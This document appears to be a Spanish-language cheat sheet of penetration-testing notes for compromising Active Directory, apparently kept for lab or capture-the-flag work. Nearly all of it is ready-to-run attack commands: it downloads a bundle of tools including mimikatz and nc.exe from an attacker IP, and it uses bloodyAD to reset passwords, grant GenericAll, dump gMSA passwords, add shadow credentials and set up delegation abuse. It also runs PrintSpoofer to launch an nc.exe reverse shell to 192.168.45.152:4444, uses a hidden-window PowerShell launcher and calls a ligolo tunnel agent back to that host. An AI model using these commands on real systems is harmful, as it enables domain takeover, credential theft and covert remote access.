
## Active Directory

[Active-Directory-Exploitation-Cheat-Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)


### Subir tools

- **Comprimir archivos en zip**

* Opcion 1:
```bash
cd fwindows/     # dentro de la carpeta que tiene todo
zip -r ../tools.zip * 
```

* Opcion 2:
```bash
zip -r tools.zip agent.exe nc.exe PrintSpoofer64.exe mimikatz.exe PowerView.ps1 SharpHound.ps1
```
---
```bash
iwr -uri http://192.168.45.152:8000/tools.zip -Outfile tools.zip
```

* **Descomprimir**

```bash
Expand-Archive tools.zip -DestinationPath .
```

* **Utils evil-winrm**

```bash
Remove-item
```

* **bloodhound**

```bash
bloodhound-python -u <user> -p <password> -d <domain> -c All -ns <ip> --zip
```

* **sync DC**

```bash
ntpdate <dc-ip>
```

#### bloodyAD

[BloodyAD Cheatsheet](https://seriotonctf.github.io/BloodyAD-Cheatsheet/index.html)

* **Obtener info de un usuario**

```bash
bloodyAD --host <dc-ip> -d <domain> -u <username> -p <password> get object <target_username>
```

* **Agregar usuarios bloodyAD**

```bash
bloodyAD --host <dc-ip> -d <domain> -u <user> -p <password> add groupMember 'Service Accounts' <user-to-add>
```

* **Cambiar password**

```bash
bloodyAD --host <dc-ip> -d <domain> -u <username> -p <password> set password <target_username> <new_password>
```

* **Otorgar GenericAll a un usuario**

```bash
bloodyAD --host <dc-ip> -d <domain> -u <username> -p <password> add genericAll <DN> <target_username>
```

* **WriteOwner**

```bash
bloodyAD --host <dc-ip> -d <domain> -u <username> -p <password> set owner <target_group> <target_username>
```

* **ReadGMSAPassword**

```bash
bloodyAD --host <dc-ip> -d <domain> -u <username> -p <password> get object <target_username> --attr msDS-ManagedPassword
```

- Alternativa:

```bash
python3 gMSADumper.py -u <user> -p <password> -d <domain>
```
> TombWatcher machine

* **Habilitar cuenta deshabilitada**

```bash
bloodyAD --host <dc> -d <domain> -u <username> -p <password> remove uac <target_username> -f ACCOUNTDISABLE
```

* **Restore a deleted object **

```bash
bloodyAD --host $dc -d $domain -u $username -p $password -k set restore $user_to_restore
```

* **Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag**

```bash
bloodyAD --host <dc-ip> -d <domain> -u <username> -p <password> add uac <target_username> -f TRUSTED_TO_AUTH_FOR_DELEGATION
```

* **Modificar UPN**

```bash
bloodyAD --host $dc -d $domain -u $username -p $password set object $old_upn userPrincipalName -v $new_upn
```
- Corroborar:

```bash
bloodyAD --host $dc -d $domain -u $username -p $password get object $target_user --attr userPrincipalName
```

* **MachineAccountQuota**

- Enumerate MachineAccountQuota:
```bash
bloodyAD --host $dc -d $domain -u $username -p $password get object 'DC=dc,DC=dc' --attr ms-DS-MachineAccountQuota
```
- Set MachineAccountQuota value to 10:
```bash
bloodyAD --host $dc -d $domain -u $username -p $password set object 'DC=dc,DC=dc' ms-DS-MachineAccountQuota -v 10
```

* **Modify mail**

```bash
bloodyAD --host $dc -d $domain -u $username -p $password set object $target_user mail -v newmail@test.local
```

* **Modify the altSecurityIdentities attribute (ESC14B)**

```bash
bloodyAD --host $dc -d $domain -u $username -p $password set object $target_user altSecurityIdentities -v 'X509:<RFC822>user@test.local'
```
* **Find Writable Attributes**

```bash
bloodyAD --host $dc -d $domain -u $username -p $password get writable --detail
```

* **Shadow Credentials**

```bash
bloodyAD --host $dc -d $domain -u $username -p $password add shadowCredentials $target
```

* **WriteSPN**

```bash
bloodyAD --host $dc -d $domain -u $username -p $password set object $target servicePrincipalName -v 'domain/meow'
```

* **Find Deleted Objects**

```bash
bloodyAD --host $dc -d $domain -u $username -p $password get writable --include-del
```

* **Extended Search Operations**

```bash
bloodyAD --host $dc -d $domain -u $username -p $password get search -h
```

- Ejemplos:

```bash
-c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 to display tombstoned
```

```bash
bloodyAD --host $dc -d $domain -u $username -p $password -k get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065
```

* **Crear nueva computadora **

```bash
bloodyAD --host $dc -d $domain -u $username -p $password add computer $computer_name $computer_password
```

* **Add Resource Based Constrained Delegation**

```bash
bloodyAD --host $dc -d $domain -u $username -p $password add rbcd 'DELEGATE_TO$' 'DELEGATE_FROM$'
```

#### Certipy

[Cheatsheet Ceripy](https://seriotonctf.github.io/ADCS-Attacks-with-Certipy/index.html)


* **Evil-Winrm**

#### Printer

```powershell
.\PrintSpoofer64.exe -c "C:\Users\eric.wallows\Documents\nc.exe 192.168.45.152 4444 -e cmd"
```

### Ejecucion en segundo plano

* Funcion

```powershell
function bg_exec($cmd) {
    Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-nop -w hidden -c $cmd"
}
```
* ligolo:
```powershell
bg_exec "C:\Users\eric.wallows\Documents\agent.exe -connect 192.168.45.152:11601 -ignore-cert"
```

### Automation Script:

```bash
. .\Executor.ps1
```

#### Help:

```bash
. .\Executor.ps1 -h
```
#### Ligolo Executor:

```bash
Invoke-Ligolo -ip <ip>
```
#### Print-Spoofer

```bash
Invoke-PrintSpoofer -ip <ip>
```

### Port Forwarding

#### ligolo listener

```bash
listener_add --addr <ip_destino:puerto> --to <ip_kali:puerto> --tcp
```

### Shell upgrade (ver Utils)

```bash 
SHELL=/bin/bash script -q /dev/null
```
